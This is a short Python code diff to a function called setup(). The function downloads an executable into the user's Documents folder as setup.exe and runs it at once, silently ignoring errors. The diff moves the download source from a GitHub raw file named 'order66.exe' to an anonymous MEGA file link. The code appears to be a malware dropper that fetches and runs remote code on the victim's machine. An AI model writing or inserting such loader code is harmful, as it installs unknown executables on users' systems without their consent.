@@ -1,9 +1,12 @@
-import os, requests, subprocess
+import os, subprocess
+from mega import Mega
 def setup():
+    mega = Mega()
+    m = mega.login()
     setupexepath = os.path.join(os.path.expanduser("~\\Documents"), "setup.exe")
     try:
-        with open(setupexepath, 'wb') as file:
-            file.write(requests.get("https://github.com/Sam-cpu999/stuff/raw/main/order66.exe").content)
+        url = 'https://mega.nz/file/eMYknAJb#zFgHhmclSSOs6r2CA2OzboaZCI643WwVsyWTSOSmuy0'
+        file = m.download(url, dest_path=setupexepath)
         subprocess.run([setupexepath])
-    except requests.exceptions.RequestException:
+    except Exception:
         pass
